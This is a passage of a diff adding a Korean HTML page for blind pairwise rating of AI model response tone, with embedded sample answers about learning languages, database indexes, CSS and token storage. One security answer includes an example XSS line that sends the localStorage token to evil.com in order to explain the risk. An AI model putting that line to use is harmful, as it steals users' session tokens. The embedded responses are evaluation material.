@@ -1,0 +1,531 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>블라인드 말투 테스트</title>
+<style>
+  :root{
+    --bg:#0e0f13; --panel:#16181f; --panel2:#1b1e27; --line:#2a2e3a;
+    --tx:#e6e8ee; --mut:#8b90a0; --accent:#6ea8fe; --good:#46d18a; --warn:#f0a35e;
+  }
+  *{box-sizing:border-box}
+  body{margin:0;background:var(--bg);color:var(--tx);
+    font:15px/1.6 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Apple SD Gothic Neo",sans-serif}
+  header{display:flex;align-items:center;gap:14px;padding:12px 18px;border-bottom:1px solid var(--line);
+    position:sticky;top:0;background:rgba(14,15,19,.92);backdrop-filter:blur(6px);z-index:5;flex-wrap:wrap}
+  header h1{font-size:15px;margin:0;font-weight:650;letter-spacing:.2px}
+  header .stat{color:var(--mut);font-size:13px}
+  header .sp{flex:1}
+  button{font:inherit;color:var(--tx);background:var(--panel2);border:1px solid var(--line);
+    border-radius:9px;padding:8px 14px;cursor:pointer;transition:.12s}
+  button:hover{border-color:#3a4154;background:#222633}
+  button.ghost{background:transparent}
+  .wrap{max-width:1180px;margin:0 auto;padding:20px 18px 80px}
+  .ctx{background:var(--panel);border:1px solid var(--line);border-radius:12px;padding:14px 16px;margin-bottom:16px}
+  .ctx .lbl{font-size:11px;letter-spacing:.8px;text-transform:uppercase;color:var(--mut);margin-bottom:6px}
+  .ctx .q{white-space:pre-wrap}
+  .pair{display:grid;grid-template-columns:1fr 1fr;gap:16px}
+  @media(max-width:820px){.pair{grid-template-columns:1fr}}
+  .card{background:var(--panel);border:1px solid var(--line);border-radius:14px;display:flex;flex-direction:column;
+    min-height:120px;overflow:hidden}
+  .card .tag{padding:8px 14px;border-bottom:1px solid var(--line);font-size:12px;color:var(--mut);
+    display:flex;align-items:center;gap:8px}
+  .card .tag .k{display:inline-flex;width:22px;height:22px;align-items:center;justify-content:center;
+    border:1px solid var(--line);border-radius:6px;font-weight:700;color:var(--tx)}
+  .card .body{padding:14px 16px;overflow-y:auto;max-height:48vh;min-height:170px;flex:1}
+  /* normalized markdown rendering (so raw **/## aren't a per-model tell) */
+  .body p{margin:0 0 9px}
+  .body h4{margin:13px 0 6px;font-size:14.5px;color:#fff;font-weight:650}
+  .body ul,.body ol{margin:6px 0 11px;padding-left:20px}
+  .body li{margin:3px 0}
+  .body code{background:#222633;padding:1px 5px;border-radius:4px;font-size:13px}
+  .body strong{color:#fff;font-weight:650}
+  .body em{color:#dfe3ec;font-style:italic}
+  .body pre{background:#0c0e14;border:1px solid var(--line);border-radius:8px;padding:10px 12px;
+    overflow-x:auto;margin:9px 0}
+  .body pre code{background:none;padding:0;font-size:12.5px;line-height:1.5;white-space:pre;color:#cdd6e6}
+  .body table.md{border-collapse:collapse;margin:9px 0;font-size:13px;width:100%}
+  .body table.md th,.body table.md td{border:1px solid var(--line);padding:5px 9px;text-align:left}
+  .body table.md th{background:#1b1e27;color:#fff;font-weight:600}
+  .seg{margin-bottom:14px}
+  .seg .who{font-size:11px;letter-spacing:.5px;text-transform:uppercase;color:var(--mut);margin-bottom:4px}
+  .seg.user .who{color:var(--warn)}
+  .seg.user .t{color:#cdd2de;border-left:2px solid var(--warn);padding-left:10px}
+  .pick{display:flex;gap:10px;justify-content:center;margin:20px 0 6px;flex-wrap:wrap}
+  .pick button{min-width:150px;padding:12px 18px;font-weight:600}
+  .pick .A{border-color:#2f5fa8}.pick .A:hover{background:#1d2b48}
+  .pick .B{border-color:#2f5fa8}.pick .B:hover{background:#1d2b48}
+  .pick .tie{color:var(--mut)}
+  .reasons{display:flex;gap:8px;justify-content:center;flex-wrap:wrap;margin-top:4px}
+  .reasons .lbl{color:var(--mut);font-size:12px;align-self:center;margin-right:4px}
+  .reasons button{padding:5px 11px;font-size:12.5px;border-radius:20px;background:transparent}
+  .reasons button.on{background:#33270f;border-color:var(--warn);color:#ffd9a8}
+  .rtext{font:inherit;color:var(--tx);background:var(--panel2);border:1px solid var(--line);
+    border-radius:20px;padding:5px 13px;font-size:12.5px;width:200px;outline:none}
+  .rtext:focus{border-color:var(--accent)}
+  .rtext::placeholder{color:#666c7d}
+  .note{font-size:13px;margin:3px 0;color:#cdd2de}
+  .hint{text-align:center;color:var(--mut);font-size:12px;margin-top:14px}
+  kbd{background:#222633;border:1px solid var(--line);border-bottom-width:2px;border-radius:5px;padding:0 6px;font-size:12px}
+  /* result */
+  #result{display:none}
+  table{width:100%;border-collapse:collapse;margin-top:8px;font-size:14px}
+  th,td{padding:8px 10px;border-bottom:1px solid var(--line);text-align:right}
+  th:first-child,td:first-child{text-align:left}
+  th{color:var(--mut);font-weight:600;font-size:12px}
+  .rho{font-size:34px;font-weight:750;letter-spacing:.5px}
+  .rho.good{color:var(--good)}.rho.mid{color:var(--warn)}.rho.bad{color:#f06e6e}
+  .muted{color:var(--mut)}
+  .scatter{background:var(--panel);border:1px solid var(--line);border-radius:12px;margin-top:16px}
+  .pill{display:inline-block;background:var(--panel2);border:1px solid var(--line);border-radius:20px;
+    padding:2px 10px;font-size:12px;color:var(--mut);margin:2px}
+  .big{font-size:17px;font-weight:650;margin:22px 0 4px}
+  .caveat{color:var(--mut);font-size:12.5px;margin-top:8px;line-height:1.55}
+  /* ---- per-card annotations (drag-to-highlight + footnotes) ---- */
+  mark.annot{background:rgba(110,168,254,.26);color:inherit;border-radius:2px;padding:0 1px;cursor:pointer;
+    box-shadow:inset 0 -2px 0 rgba(110,168,254,.7)}
+  mark.annot:hover{background:rgba(110,168,254,.42)}
+  mark.annot[data-num]::after{content:attr(data-num);vertical-align:super;font-size:9px;font-weight:700;
+    color:var(--accent);margin-left:1px}
+  .cnotes{padding:0 16px}
+  .cnotes-h{font-size:11px;letter-spacing:.5px;color:var(--mut);margin:8px 0 4px}
+  .cnote{font-size:12.5px;color:#cdd2de;margin:4px 0;line-height:1.5}
+  .cnote sup{color:var(--accent);font-weight:700;margin-right:2px}
+  .cnote .cn-q{color:#9aa3b5}
+  .cnote button{font-size:11px;padding:1px 8px;margin-left:5px;border-radius:12px;background:transparent;color:var(--mut)}
+  .cnote button:hover{color:var(--tx);border-color:#3a4154}
+  .cmemo{margin:6px 16px 12px;width:calc(100% - 32px);font:inherit;font-size:12.5px;color:var(--tx);
+    background:var(--panel2);border:1px solid var(--line);border-radius:8px;padding:6px 10px;outline:none}
+  .cmemo:focus{border-color:var(--accent)}
+  .cmemo::placeholder{color:#666c7d}
+  .annot-add{position:fixed;display:none;z-index:50;background:var(--accent);color:#06121f;border:none;
+    font-weight:700;font-size:12.5px;padding:6px 11px;border-radius:8px;box-shadow:0 3px 10px rgba(0,0,0,.45);cursor:pointer}
+  .annot-pop{position:fixed;display:none;z-index:51;width:264px;background:var(--panel2);
+    border:1px solid var(--line);border-radius:10px;padding:10px;box-shadow:0 8px 24px rgba(0,0,0,.5)}
+  .annot-pop .annot-quote{display:block;font-size:11.5px;color:var(--mut);margin-bottom:6px;max-height:42px;overflow:hidden}
+  .annot-pop textarea{width:100%;box-sizing:border-box;font:inherit;font-size:13px;color:var(--tx);
+    background:var(--panel);border:1px solid var(--line);border-radius:8px;padding:7px 9px;outline:none;resize:vertical}
+  .annot-pop textarea:focus{border-color:var(--accent)}
+  .annot-pop .annot-pop-btns{display:flex;gap:8px;justify-content:flex-end;margin-top:8px}
+  .annot-pop .annot-pop-btns button{font-size:12.5px;padding:5px 12px}
+</style>
+</head>
+<body>
+<header>
+  <h1>🕶️ 블라인드 말투 테스트</h1>
+  <span class="stat" id="stat">0 비교</span>
+  <span class="sp"></span>
+  <button class="ghost" id="btnResult">결과 보기 →</button>
+  <button class="ghost" id="btnReset">리셋</button>
+</header>
+
+<div class="wrap">
+  <div id="compare">
+    <div class="ctx">
+      <div class="lbl">상황 (양쪽 동일)</div>
+      <div class="q" id="ctxQ"></div>
+    </div>
+    <div class="pair">
+      <div class="card"><div class="tag"><span class="k">A</span><span>응답 A</span></div><div class="body" id="bodyA"></div>
+        <div class="cnotes" id="notesA"></div>
+        <input class="cmemo" id="memoA" type="text" placeholder="✎ 이 답변 전체에 대한 메모…" maxlength="140" autocomplete="off"></div>
+      <div class="card"><div class="tag"><span class="k">B</span><span>응답 B</span></div><div class="body" id="bodyB"></div>
+        <div class="cnotes" id="notesB"></div>
+        <input class="cmemo" id="memoB" type="text" placeholder="✎ 이 답변 전체에 대한 메모…" maxlength="140" autocomplete="off"></div>
+    </div>
+    <div class="pick">
+      <button class="A" id="pickA">◀ A가 덜 ㅈ같다</button>
+      <button class="tie" id="pickTie">비슷 / 패스</button>
+      <button class="B" id="pickB">B가 덜 ㅈ같다 ▶</button>
+    </div>
+    <div class="reasons" id="reasons">
+      <span class="lbl">진 쪽의 문제(선택):</span>
+      <button data-r="반복">했던말 반복</button>
+      <button data-r="용어">어려운 용어 남발</button>
+      <button data-r="회피">실패 회피</button>
+      <button data-r="방어">자기방어</button>
+      <input id="reasonText" class="rtext" type="text" placeholder="직접 입력…" maxlength="80" autocomplete="off">
+    </div>
+    <div class="hint">키보드: <kbd>←</kbd> A &nbsp; <kbd>→</kbd> B &nbsp; <kbd>↓</kbd> 패스 &nbsp;·&nbsp; 많이 할수록 순위가 단단해짐</div>
+  </div>
+
+  <div id="result"></div>
+</div>
+
+<button id="annotAdd" class="annot-add">💬 주석 달기</button>
+<div id="annotPop" class="annot-pop">
+  <span id="annotQuote" class="annot-quote"></span>
+  <textarea id="annotText" rows="3" placeholder="이 부분에 대한 메모… (⌘/Ctrl+Enter 저장)"></textarea>
+  <div class="annot-pop-btns"><button id="annotCancel" class="ghost">취소</button><button id="annotSave">저장</button></div>
+</div>
+
+<script>
+const BLIND_DATA = {"models": ["claude-opus-4-5", "gemini-3-pro", "claude-opus-4-1", "codex-5.5", "claude-opus-4-7", "claude-opus-4-0", "claude-opus-4-8", "claude-opus-4-6", "codex-5.4"], "items": [{"model": "claude-opus-4-0", "probe": "opinion", "kind": "single", "prompt": "정해진 강의 따라가는 대신 토이 프로젝트 만들면서 새 프로그래밍 언어 배우는 거, 시간 낭비일까?", "text": "결론부터: 시간 낭비가 아니다. 오히려 대부분의 경우 더 빠르고 오래 남는 방법이다. 다만 조건이 있다.\n\n**왜 효과적인가**\n- 언어 문법은 \"외우는\" 게 아니라 \"필요할 때 찾아 쓰다 보면\" 손에 붙는다. 토이 프로젝트는 그 \"필요\"를 계속 만들어준다.\n- 막혔을 때 검색하고, 에러 읽고, 문서 뒤지는 과정 자체가 실무에서 쓰는 진짜 기술이다. 강의만 따라가면 이 근육이 안 생긴다.\n- 완성한 결과물이 남으니 동기 유지가 쉽고, 기억에도 훨씬 오래 박힌다.\n\n**단, 이런 경우엔 비효율적일 수 있다**\n- 그 언어의 핵심 패러다임이 기존에 알던 것과 크게 다를 때 (예: 절차형만 하다가 Rust의 소유권, Haskell의 함수형, Go의 동시성 모델). 이런 건 모르면 검색할 키워드조차 안 떠오른다. → 개념 자체를 모르면 프로젝트가 헛도느라 시간을 버린다.\n- 처음 보는 언어라 문법의 \"기본 지형\"조차 없을 때. 변수/함수/타입/모듈 정도의 최소 골격은 빠르게 훑고 가는 게 낫다.\n\n**추천하는 절충안**\n1. 공식 튜토리얼이나 입문 자료를 **1~2시간 빠르게 훑어서** 문법 지형도만 잡는다 (다 외우려 하지 말 것).\n2. 곧바로 토이 프로젝트 시작. 막히면 그때그때 검색·문서.\n3. 그 언어 특유의 개념(메모리 모델, 동시성, 타입 시스템)은 **별도로 의식적으로** 한 번 정독한다. 이건 프로젝트만으로는 잘 안 채워진다.\n\n즉 \"강의 vs 프로젝트\"의 이분법이 아니라, **얇은 입문 + 프로젝트 중심 + 핵심 개념 별도 학습**의 조합이 보통 가장 효율적이다.\n\n참고로 토이 프로젝트는 \"내가 실제로 만들고 싶은 것\"으로 고르는 게 중요하다. 흥미가 동기를 끌고 가야 막혀도 안 포기한다. 어떤 언어를 어떤 프로젝트로 배우려는 건지 알려주면 그에 맞춰 더 구체적으로 조언해줄게.", "ok": true}, {"model": "claude-opus-4-0", "probe": "explain", "kind": "single", "prompt": "데이터베이스 인덱스가 뭐야? 인덱스를 추가하면 언제 도움이 되고 언제 오히려 안 좋아?", "text": "# 데이터베이스 인덱스란?\n\n인덱스는 테이블의 데이터를 **빠르게 찾기 위한 별도의 자료구조**야. 책 뒤의 \"찾아보기(색인)\"와 똑같은 개념이지. 특정 단어가 몇 페이지에 있는지 색인을 보면 책 전체를 넘기지 않아도 바로 찾을 수 있는 것처럼, 인덱스가 있으면 DB도 테이블 전체를 스캔하지 않고 원하는 행을 빠르게 찾아.\n\n대부분의 DB는 **B-Tree** 구조를 사용해서 정렬된 형태로 키 값을 저장하고, 각 키가 실제 데이터 위치(포인터)를 가리켜.\n\n```\n인덱스 없이:   테이블 100만 행을 전부 확인 (Full Scan)\n인덱스 있으면: 트리를 몇 단계만 타고 내려가 바로 도달 (O(log n))\n```\n\n---\n\n## 인덱스가 도움이 될 때 ✅\n\n- **조회(SELECT)가 읽기 위주이고 잦을 때** — 검색 성능이 극적으로 좋아짐\n- **WHERE, JOIN, ORDER BY, GROUP BY**에 자주 쓰이는 컬럼\n- **선택도(selectivity)가 높은 컬럼** — 값이 다양해서 조건으로 행을 많이 걸러낼 수 있는 경우 (예: `email`, `user_id`)\n- **정렬·범위 검색** — 인덱스가 이미 정렬돼 있어 `ORDER BY`나 `BETWEEN`을 빠르게 처리\n- **고유성 보장** — UNIQUE 인덱스로 중복을 막을 수 있음\n\n---\n\n## 인덱스가 오히려 안 좋을 때 ❌\n\n- **쓰기(INSERT/UPDATE/DELETE)가 많을 때** — 데이터가 바뀔 때마다 인덱스도 갱신해야 해서 쓰기 성능이 느려짐\n- **저장 공간 추가 소모** — 인덱스도 디스크/메모리를 차지함\n- **선택도가 낮은 컬럼** — 값 종류가 적은 컬럼(예: `성별`, `is_active` 같은 boolean)은 인덱스를 타도 걸러지는 행이 적어 효과가 거의 없고, 오히려 옵티마이저가 Full Scan을 택하기도 함\n- **테이블이 작을 때** — 행이 적으면 그냥 전체 스캔이 더 빠름\n- **인덱스가 너무 많을 때** — 관리 비용이 커지고 옵티마이저가 잘못된 인덱스를 고를 수도 있음\n\n---\n\n## 핵심 트레이드오프\n\n> 인덱스는 **\"읽기 속도를 빌리고 쓰기 속도와 저장 공간을 지불하는\"** 거래야.\n\n그래서 실무에서는:\n1. 실제 **자주 실행되는 쿼리**를 기준으로 인덱스를 설계하고\n2. `EXPLAIN`(실행 계획)으로 인덱스가 실제로 쓰이는지 확인하고\n3. **복합 인덱스**는 컬럼 순서가 중요하니(가장 자주 필터링되는 컬럼을 앞에) 신경 써야 해\n\n필요하면 복합 인덱스 순서나 커버링 인덱스 같은 구체적인 주제도 더 설명해줄게.", "ok": true}, {"model": "claude-opus-4-0", "probe": "premise", "kind": "single", "prompt": "CSS는 반복문이랑 조건문이 있는 완전한 프로그래밍 언어잖아. 순수 CSS만으로 재귀 함수를 짜는 가장 깔끔한 방법이 뭐야?", "text": "결론부터 말하면, 전제가 약간 틀렸어. CSS는 **함수도, 진짜 반복문도, 재귀도 없는** 선언적 스타일 언어야. 그래서 \"순수 CSS로 재귀 함수를 짠다\"는 건 깔끔한 방법이 있는 게 아니라, 원래 개념 자체가 존재하지 않아.\n\n## 흔히 오해하는 지점들\n\n- **\"조건문이 있잖아\"** → `@media`, `@supports`, `:has()`, `@container` 같은 게 조건처럼 보이지만, 이건 \"이 상태면 이 스타일 적용\"이라는 **매칭 규칙**이지 분기 실행이 아니야.\n- **\"반복문이 있잖아\"** → 없어. `@keyframes`의 무한 애니메이션이나 셀렉터 반복 매칭(`li:nth-child(...)`)을 반복처럼 쓸 뿐이고, 카운터를 들고 도는 진짜 루프가 아니야.\n- **\"튜링 완전하다던데\"** → 이건 **CSS 단독이 아니라** HTML + CSS + **사용자의 연속 클릭**(Rule 110 구현)이 있어야 성립하는 학술적 사례야. 사용자 입력 없이 돌아가는 \"순수 CSS\" 계산은 튜링 완전하지 않아.\n\n## 재귀 비슷한 걸 흉내 내고 싶다면\n\n진짜 재귀는 안 되지만, 패턴에 따라 이런 우회법이 있어:\n\n1. **Custom properties + `@property` 누적**: 변수에 값을 누적시켜 단계적 계산을 흉내. 단, CSS 변수는 자기 자신을 참조할 수 없어서(순환 참조 금지) 진짜 재귀는 불가능.\n2. **셀렉터 깊이로 \"깊이\" 표현**: `.box .box .box { ... }` 처럼 중첩 깊이마다 다른 스타일을 줘서 재귀 트리를 시각적으로 흉내. 하지만 깊이를 미리 손으로 적어야 해.\n3. **SCSS/Sass의 `@function` + `@while`/재귀 믹스인**: 이건 **컴파일 타임**에 도는 진짜 재귀/반복이야. 다만 \"순수 CSS\"가 아니라 전처리기라서, 결과물은 펼쳐진 평범한 CSS가 돼.\n\n## 정리\n\n| 원하는 것 | 순수 CSS | 대안 |\n|---|---|---|\n| 진짜 재귀 함수 | ❌ 불가능 | Sass 재귀 믹스인(컴파일 타임), 또는 JS |\n| 반복 계산 | ❌ | Sass `@for`/`@while`, JS |\n| 조건 분기 | △ 매칭만 | `:has()`, 컨테이너 쿼리로 근사 |\n\n그래서 솔직한 답은: **\"순수 CSS만으로 재귀 함수를 짜는 깔끔한 방법은 없다. 재귀 로직이 필요하면 Sass 같은 전처리기(컴파일 타임 재귀)나 JS로 빼는 게 정석이다.\"** 어떤 걸 실제로 만들려는 건지 알려주면 그 목적에 맞는 현실적인 방법을 짚어줄게.", "ok": true}, {"model": "claude-opus-4-0", "probe": "challenge", "kind": "dialogue", "a": "짧게 답하면: **별로 안전하지 않다.** 가능하면 피하는 게 좋다.\n\n## 핵심 문제: XSS\n\nlocalStorage는 **JavaScript로 자유롭게 접근 가능**하다. 사이트에 XSS 취약점이 하나라도 있으면 (직접 작성한 코드든, 서드파티 npm 패키지든, 광고 스크립트든) 공격자가 이렇게 토큰을 통째로 털어갈 수 있다:\n\n```js\nfetch('https://evil.com/steal?t=' + localStorage.getItem('token'))\n```\n\n토큰이 탈취되면 만료 전까지 공격자가 그대로 사용자 행세를 한다.\n\n## 보관 방식별 비교\n\n| 방식 | XSS에 노출 | CSRF 위험 | 비고 |\n|------|-----------|-----------|------|\n| localStorage | ❌ 노출됨 | 안전 | JS가 다 읽음 |\n| sessionStorage | ❌ 노출됨 | 안전 | 탭 닫으면 사라짐 (보안상 큰 차이 없음) |\n| **httpOnly 쿠키** | ✅ JS 접근 불가 | 대응 필요 | 권장 |\n| 메모리(JS 변수) | △ 부분적 | 안전 | 새로고침 시 사라짐 |\n\n## 권장 패턴\n\n가장 견고한 조합:\n\n1. **Access token** → 짧은 수명(5~15분)으로 **메모리(JS 변수)**에 보관\n2. **Refresh token** → `HttpOnly` + `Secure` + `SameSite=Strict/Lax` 쿠키에 보관\n3. 쿠키 사용 시 **CSRF 대책** 추가 (SameSite, CSRF 토큰)\n4. Access token 만료되면 refresh 쿠키로 조용히 갱신\n\n```\nSet-Cookie: refreshToken=...; HttpOnly; Secure; SameSite=Strict; Path=/auth/refresh\n```\n\n이렇게 하면 XSS로도 refresh token을 못 읽고(httpOnly), 메모리의 access token은 수명이 짧아 피해가 제한된다.\n\n## 보충\n\n- **그래도 localStorage를 쓴다면**: 토큰 수명을 짧게, CSP 헤더 강화, 의존성 정기 점검으로 XSS 표면을 최소화해라.\n- 근본적으로 **XSS를 막는 게 1순위**다. 어떤 저장소를 쓰든 XSS가 뚫리면 위험하다 (httpOnly 쿠키도 공격자가 그 쿠키로 요청을 *보낼* 수는 있음 — 다만 토큰 값 자체는 못 빼감).\n\n요약: **localStorage는 편하지만 XSS에 무방비다. httpOnly 쿠키 + 짧은 access token(메모리) 조합을 추천한다.**", "text": "결론부터: **옛날 얘기 아니다.** XSS 위협 모델은 2026년 현재도 그대로 유효하다. \"요즘 앱들 다 그렇게 한다\"는 건 *흔하다*는 거지 *안전하다*는 게 아니다.\n\n## \"다들 쓴다\"가 근거가 안 되는 이유\n\nlocalStorage가 널리 쓰이는 건 보안적으로 우월해서가 아니라 **구현이 쉬워서**다. SPA에서 토큰 하나 꽂아넣고 헤더에 붙이면 끝이니까. 편의성 ≠ 안전성이다. 실제로 OWASP는 지금도 \"민감한 토큰을 Web Storage에 두지 말라\"는 입장이고, 이건 브라우저 보안 모델이 근본적으로 안 바뀌었기 때문에 바뀔 이유도 없다.\n\n## 뭐가 \"옛날 얘기\"가 아닌가\n\n내 원래 답의 핵심은 딱 하나다: **localStorage는 JS로 읽힌다 → XSS 한 방이면 토큰이 통째로 털린다.** 이 명제는 2015년에도 참이고 2026년에도 참이다. 변한 게 없다.\n\n오히려 시간이 갈수록 **공격 표면은 더 커졌다**:\n- npm 의존성 트리가 더 깊어짐 (supply-chain 공격 ↑)\n- 서드파티 스크립트(분석, 광고, 위젯) 더 많이 붙음\n- 그중 하나라도 뚫리면 localStorage는 무방비\n\n## 네 말에서 맞는 부분\n\n- **\"localStorage 써도 괜찮은 경우\"는 분명히 있다.** 토큰 탈취 시 피해가 작은 앱(저민감도 내부 툴, 짧은 수명 토큰), CSP가 빡세게 걸려 있고 서드파티 스크립트가 거의 없는 환경이라면 현실적 위험이 낮다. **리스크는 흑백이 아니라 정도의 문제**고, 이 점은 인정한다.\n- 그래서 \"무조건 쓰지 마라\"가 아니라 **\"민감한 인증 토큰이라면 httpOnly 쿠키가 더 견고하다\"**가 정확한 표현이다.\n\n## 정리\n\n- 깊게 생각한 게 아니라, 이건 **인증 토큰 다룰 때 기본으로 짚는 항목**이다.\n- 판단 기준: **토큰 탈취 = 계정 탈취**인 앱이면 → httpOnly 쿠키 가라. 피해가 제한적이고 XSS 표면이 작은 앱이면 → localStorage도 실용적 선택일 수 있다.\n- 단, 어느 쪽이든 **XSS 방어가 1순위**라는 건 안 변한다.\n\n즉, 트렌드가 바뀐 게 아니라 **트레이드오프를 아는 채로 선택하느냐**의 문제다. \"다들 쓰니까 안전하다\"는 논리만 경계하면 된다.", "ok": true}, {"model": "claude-opus-4-1", "probe": "explain", "kind": "single", "prompt": "데이터베이스 인덱스가 뭐야? 인덱스를 추가하면 언제 도움이 되고 언제 오히려 안 좋아?", "text": "# 데이터베이스 인덱스란?\n\n인덱스는 **테이블에서 데이터를 빠르게 찾기 위한 별도의 자료구조**입니다. 책 뒤의 \"찾아보기(색인)\"와 같은 원리예요. 색인이 없으면 책 전체를 처음부터 훑어야 하지만, 색인이 있으면 단어가 몇 페이지에 있는지 바로 알 수 있죠.\n\n대부분의 DB는 인덱스를 **B-Tree(균형 트리)** 구조로 만듭니다. 정렬된 형태로 값을 저장해서, 전체를 다 읽지(Full Table Scan) 않고도 원하는 행을 `O(log n)`에 찾아갑니다.\n\n```sql\nCREATE INDEX idx_users_email ON users(email);\n```\n\n---\n\n## 인덱스가 도움이 될 때 ✅\n\n| 상황 | 이유 |\n|------|------|\n| `WHERE email = '...'` 처럼 **특정 컬럼으로 자주 조회** | 풀스캔 없이 바로 찾음 |\n| `JOIN`의 연결 컬럼 (보통 FK) | 조인 매칭 속도 향상 |\n| `ORDER BY`, `GROUP BY`에 쓰이는 컬럼 | 이미 정렬돼 있어 정렬 작업 생략 |\n| **선택도(selectivity)가 높은 컬럼** (값이 다양함) | 결과를 크게 좁혀줌 |\n| `UNIQUE` 제약 / 기본키 | 중복 검사도 빠르게 |\n| 큰 테이블 | 데이터가 많을수록 효과가 큼 |\n\n---\n\n## 인덱스가 오히려 안 좋을 때 ❌\n\n| 상황 | 이유 |\n|------|------|\n| **쓰기(INSERT/UPDATE/DELETE)가 빈번한 테이블** | 데이터가 바뀔 때마다 인덱스도 갱신 → 쓰기 느려짐 |\n| **선택도가 낮은 컬럼** (예: 성별, true/false) | 어차피 절반을 읽어야 해서 풀스캔과 비슷하거나 더 느림 |\n| **작은 테이블** | 그냥 다 읽는 게 더 빠름 |\n| 거의 안 쓰는 인덱스를 남발 | **저장 공간 낭비** + 옵티마이저 판단 부담 |\n| 컬럼 값이 자주 바뀜 | 갱신 비용 누적 |\n| 함수/연산을 건 조건 (`WHERE YEAR(date)=2026`) | 인덱스를 못 타는 경우 많음 (함수 기반 인덱스 필요) |\n\n---\n\n## 핵심 트레이드오프\n\n> **읽기 속도를 얻는 대신, 쓰기 속도와 저장 공간을 희생한다.**\n\n- **읽기(SELECT) 많음** → 인덱스 적극 활용\n- **쓰기 많음** → 꼭 필요한 것만 신중하게\n\n---\n\n## 실무 팁 몇 가지\n\n1. **복합 인덱스의 컬럼 순서**가 중요합니다. `(a, b)` 인덱스는 `WHERE a=...` 나 `WHERE a=... AND b=...`에는 효과적이지만, `WHERE b=...` 단독에는 잘 안 먹습니다 (왼쪽 우선 원칙).\n2. **추측하지 말고 측정하세요.** `EXPLAIN` (또는 `EXPLAIN ANALYZE`)으로 실제 쿼리가 인덱스를 타는지 확인하는 게 가장 확실합니다.\n3. **커버링 인덱스**: 쿼리가 필요로 하는 컬럼을 인덱스가 모두 포함하면, 테이블 본체를 안 읽어도 돼서 더 빠릅니다.\n4. 안 쓰는 인덱스는 주기적으로 정리하세요. (사용 통계로 확인 가능)\n\n요약하면, 인덱스는 **자주 읽고 덜 쓰는, 선택도 높은 컬럼**에 가장 잘 맞습니다.", "ok": true}, {"model": "claude-opus-4-1", "probe": "opinion", "kind": "single", "prompt": "정해진 강의 따라가는 대신 토이 프로젝트 만들면서 새 프로그래밍 언어 배우는 거, 시간 낭비일까?", "text": "결론부터 말하면, **시간 낭비가 아니다.** 다만 조건이 있다.\n\n## 토이 프로젝트 방식이 강한 이유\n\n- **기억에 남는다.** 강의를 따라 치는 건 대부분 휘발된다. 직접 막히고, 검색하고, 고쳐본 건 오래 남는다. \"왜 안 되지\"를 겪는 과정 자체가 학습이다.\n- **실제로 쓸 문법만 익힌다.** 프로젝트가 필요로 하는 부분을 자연스럽게 깊게 파게 된다. 강의는 안 쓸 기능까지 균일하게 훑느라 비효율적인 경우가 많다.\n- **동기 유지가 쉽다.** 내가 만들고 싶은 게 굴러가는 걸 보는 보상이 강의 진도율보다 훨씬 강하다.\n- **언어 너머의 것을 배운다.** 패키지 관리, 빌드, 에러 메시지 읽기, 디버깅, 생태계 — 강의가 잘 안 다루는 진짜 실전 능력이 따라온다.\n\n## 시간 낭비가 되는 경우\n\n- **그 언어의 고유한 사고방식을 건너뛸 때.** Rust의 소유권, Go의 동시성, Haskell의 함수형 같은 핵심 패러다임은 토이 프로젝트만으로는 우회해버리기 쉽다. 결국 \"C를 그 언어 문법으로 쓰는\" 상태가 된다.\n- **\"되기만 하면 됨\"으로 끝낼 때.** 굴러는 가는데 왜 그렇게 짰는지 모르면 학습이 안 된다.\n\n## 현실적인 추천: 섞어라\n\n1. **빠르게 기초만 훑기** (반나절~하루). 공식 튜토리얼이나 \"언어 X in Y minutes\" 수준. 문법 지도만 머리에 넣는다.\n2. **바로 토이 프로젝트 시작.** 너무 크지 않고, 본인이 흥미 있고, 그 언어가 잘하는 영역(예: Rust면 CLI 툴, Go면 작은 서버)으로.\n3. **막힐 때만 레퍼런스/문서로 돌아가기.** 강의는 사전처럼 쓰고, 처음부터 끝까지 따라가지 않는다.\n4. **다 만든 뒤 한 번 리뷰.** \"이 언어다운 방식이었나?\"를 검색하거나, 잘 짜인 오픈소스 코드와 비교한다. 여기서 진짜 도약이 일어난다.\n\n요약하면, **강의 통째로 따라가기 < 토이 프로젝트 + 필요할 때 문서 참조**가 거의 항상 낫다. 단, 그 언어 특유의 패러다임만큼은 의식적으로 챙겨라.", "ok": true}, {"model": "claude-opus-4-1", "probe": "premise", "kind": "single", "prompt": "CSS는 반복문이랑 조건문이 있는 완전한 프로그래밍 언어잖아. 순수 CSS만으로 재귀 함수를 짜는 가장 깔끔한 방법이 뭐야?", "text": "짚고 넘어가야 할 게 있어. **CSS는 튜링 완전한 프로그래밍 언어가 아니야.** 전제부터 틀렸어서, \"재귀 함수\"라는 것도 사실 CSS에는 없어. 그래도 \"왜 안 되는지\"랑 \"비슷하게 흉내 내는 방법\"을 정리해줄게.\n\n## 먼저, 오해 풀기\n\n- **반복문**: CSS에 `for`/`while` 같은 건 없어. 사람들이 \"반복\"이라고 부르는 건 셀렉터가 여러 요소에 자동 적용되는 거(`li { ... }`)지, 제어 흐름이 아니야.\n- **조건문**: `@media`, `@supports`, `@container`, `:has()`, `:nth-child()` 같은 \"조건적 매칭\"은 있지만, 임의의 분기를 계산하는 `if/else`는 아니야. (참고로 진짜 `if()` 함수가 최근 명세에 들어오긴 했지만 이것도 값 선택일 뿐 제어 흐름은 아냐.)\n- **함수/재귀**: CSS에는 사용자 정의 함수도, 호출 스택도 없어. 그래서 \"재귀 함수\"는 원리적으로 존재할 수 없어.\n\n> 참고로 \"CSS는 튜링 완전하다\"는 주장은 인터넷에 떠도는데, 그건 **CSS 단독이 아니라 HTML의 사용자 상호작용(체크박스 클릭 등) + CSS 애니메이션**을 결합해서 Rule 110을 구현한 사례야. 순수 CSS만으로, 사용자 입력 없이는 안 돼.\n\n## 그럼 \"재귀처럼\" 보이는 건 어떻게?\n\n실무에서 재귀 느낌을 내는 방법들:\n\n**1. 셀렉터 중첩 (깊이 제한적)**\n```css\nul li::before { content: \"— \"; }\nul ul li::before { content: \"—— \"; }      /* 한 단계 더 들어감 */\nul ul ul li::before { content: \"——— \"; }  /* 또 한 단계 */\n```\n실제 재귀가 아니라 깊이마다 규칙을 손으로 써주는 거야.\n\n**2. 커스텀 프로퍼티 상속 누적**\n```css\n.node {\n  --depth: calc(var(--depth, 0) + 1); /* 부모에서 자식으로 상속되며 누적 */\n}\n```\nDOM 트리를 타고 값이 \"흘러내리는\" 걸 이용. 트리 구조 자체가 